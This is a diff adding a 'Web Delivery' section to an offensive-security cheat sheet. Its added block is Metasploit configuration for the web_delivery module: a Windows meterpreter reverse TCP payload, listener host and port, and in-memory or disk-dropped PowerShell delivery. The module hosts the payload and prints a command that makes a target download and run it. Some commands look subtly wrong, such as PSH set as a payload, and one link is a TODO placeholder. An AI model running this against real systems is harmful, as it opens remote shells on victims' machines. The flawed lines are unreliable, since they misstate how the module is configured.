@@ -271,6 +271,31 @@ set ports 1-65535
 
 This is especially useful when routing through existing meterpreter sessions.
 
+### Web Delivery
+
+[Web delivery](TODO) Metasploit module can be useful for executing meterpreter agents on target in-memory when you can run commands but don't have a great interactive environment yet:
+
+```sh
+use exploit/multi/script/web_delivery
+
+# Adjust payload as necessary.
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 1337
+
+# For in-memory PowerShell payload.
+set payload PSH
+
+# For PowerShell payload that gets dropped to disk.
+set payload PSH (Binary)
+
+# Run the module. This will host the final payload on an HTTP server, print the
+# command to be run on target to download and execute the payload, and run the
+# payload module for the final connection (i.e., start a listener for a reverse
+# TCP payload).
+run
+```
+
 ### Ping Subnet Scanning
 
 If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:
